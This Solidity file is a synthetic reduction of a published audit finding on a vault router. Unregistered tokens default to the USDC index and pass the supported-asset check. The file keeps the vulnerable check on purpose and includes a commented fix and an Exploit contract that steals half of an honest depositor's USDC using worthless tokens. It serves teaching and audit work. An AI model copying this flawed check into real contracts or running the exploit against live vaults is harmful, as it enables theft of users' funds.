// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Blueberry HyperVaultRouter — [C-02] Missing asset index check allows any
    token to mint shares (Pashov Audit Group 2025-04-30, #61477)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: deposit() looks up $.assetIndexes[asset] and checks
    _isAssetSupported(assetIndex). Unregistered tokens return the default
    mapping value 0, and USDC is hardcoded as USDC_SPOT_INDEX = 0, so the
    check falsely passes for ANY unregistered ERC20. The token is then
    treated as USDC and shares are minted at USDC pricing. Attacker redeems
    worthless-token shares for real USDC from honest depositors.

    Vulnerable check preserved verbatim (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal share token minted by the router.
contract ShareToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function burn(address from, uint256 amt) external {
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }
}

/// @notice Reduced HyperVaultRouter — deposit accepts unregistered tokens as USDC.
/// Source: HyperVaultRouter.deposit / _isAssetSupported (Pashov Blueberry 2025-04-30).
contract HyperVaultRouter {
    uint64 public constant USDC_SPOT_INDEX = 0;

    MockERC20 public immutable usdc;
    ShareToken public immutable shareToken;
    /// @dev asset => index; unregistered assets default to 0 (== USDC_SPOT_INDEX).
    mapping(address => uint64) public assetIndexes;
    mapping(uint64 => bool) private _supported;

    constructor(MockERC20 _usdc, ShareToken _share) {
        usdc = _usdc;
        shareToken = _share;
        // USDC is hardcoded at index 0 and is supported.
        assetIndexes[address(_usdc)] = USDC_SPOT_INDEX;
        _supported[USDC_SPOT_INDEX] = true;
    }

    function addAsset(address asset, uint64 index) external {
        require(index != USDC_SPOT_INDEX, "use usdc");
        assetIndexes[asset] = index;
        _supported[index] = true;
    }

    function _isAssetSupported(uint64 assetIndex_) internal view returns (bool) {
        // Index 0 (USDC) is always considered supported.
        return assetIndex_ == USDC_SPOT_INDEX || _supported[assetIndex_];
    }

    /// @notice Deposit `amount` of `asset` and mint shares priced as if USDC (8→18 decimals).
    function deposit(address asset, uint256 amount) external {
        uint64 assetIndex_ = assetIndexes[asset];
        // Unregistered asset returns assetIndex_==0 (USDC), so check passes for any token
        require(_isAssetSupported(assetIndex_), "COLLATERAL_NOT_SUPPORTED"); // @> VULN: index 0 default accepts any token as USDC
        // FIX: require(assetIndex_ != 0 || asset == address(usdc), "not usdc");
        //      require(_isAssetSupported(assetIndex_), "COLLATERAL_NOT_SUPPORTED");

        // Protocol pulls the deposited token (worthless junk is accepted the same as USDC).
        require(MockERC20(asset).transferFrom(msg.sender, address(this), amount), "xfer");
        // Mint shares as if the deposit were USDC: scale 8-dec → 18-dec 1:1.
        uint256 shares = amount * 1e10;
        shareToken.mint(msg.sender, shares);
    }

    /// @notice TVL is real USDC only (junk tokens do not increase TVL).
    function tvl() public view returns (uint256) {
        return usdc.balanceOf(address(this)) * 1e10;
    }

    /// @notice Redeem shares for a pro-rata slice of real USDC TVL.
    function redeem(uint256 shares) external returns (uint256 assetsOut) {
        uint256 supply = shareToken.totalSupply();
        require(supply > 0 && shares > 0, "shares");
        uint256 tvl_ = tvl();
        assetsOut = (shares * tvl_) / supply;
        // Convert 18-dec share units back to 8-dec USDC amount.
        uint256 usdcOut = assetsOut / 1e10;
        shareToken.burn(msg.sender, shares);
        require(usdc.transfer(msg.sender, usdcOut), "out");
    }
}

/// @notice Bob deposits a worthless token, mints USDC-priced shares, redeems real USDC.
contract Exploit {
    MockERC20 public usdc; // CREATE nonce 1
    ShareToken public shareToken; // CREATE nonce 2
    HyperVaultRouter public router; // CREATE nonce 3 — vulnerable
    MockERC20 public junk; // CREATE nonce 4

    uint256 public aliceSharesBefore;
    uint256 public bobUsdcStolen;
    uint256 public tvlAfterJunkDeposit;
    uint256 public shareSupplyAfterJunk;

    constructor() {
        usdc = new MockERC20("USD Coin", "USDC", 8);
        shareToken = new ShareToken();
        router = new HyperVaultRouter(usdc, shareToken);
        junk = new MockERC20("Random", "RND", 8);
    }

    function run() external {
        // Alice deposits 100e8 real USDC → 100e18 shares; TVL = 100e18.
        usdc.mint(address(this), 100e8);
        usdc.approve(address(router), 100e8);
        router.deposit(address(usdc), 100e8);
        aliceSharesBefore = shareToken.balanceOf(address(this));
        require(aliceSharesBefore == 100e18, "alice shares");
        require(router.tvl() == 100e18, "tvl after alice");

        // Bob deposits 100e8 worthless junk via the same deposit path.
        // assetIndexes[junk] == 0 (default) → treated as USDC → 100e18 shares minted.
        junk.mint(address(this), 100e8);
        junk.approve(address(router), 100e8);
        router.deposit(address(junk), 100e8);

        uint256 bobShares = shareToken.balanceOf(address(this)) - aliceSharesBefore;
        require(bobShares == 100e18, "bob should mint 100e18 shares from junk");
        tvlAfterJunkDeposit = router.tvl();
        shareSupplyAfterJunk = shareToken.totalSupply();
        // TVL still 100e18 (only real USDC); supply is now 200e18.
        require(tvlAfterJunkDeposit == 100e18, "tvl unchanged by junk");
        require(shareSupplyAfterJunk == 200e18, "supply inflated");

        // Bob redeems his junk-minted shares for half of the real USDC vault.
        uint256 usdcBefore = usdc.balanceOf(address(this));
        // burn only bob's 100e18 (alice still holds 100e18 on this same address in the synthetic;
        // redeem the second half of supply by redeeming 100e18 of the 200e18 total).
        router.redeem(100e18);
        bobUsdcStolen = usdc.balanceOf(address(this)) - usdcBefore;
        // Half of 100e8 USDC = 50e8 stolen from Alice's deposit.
        require(bobUsdcStolen == 50e8, "stole half of alice usdc");
        // Alice's remaining claim is only 50e8 for her full 100e18 shares (diluted 50%).
        require(usdc.balanceOf(address(router)) == 50e8, "router left half");
    }
}
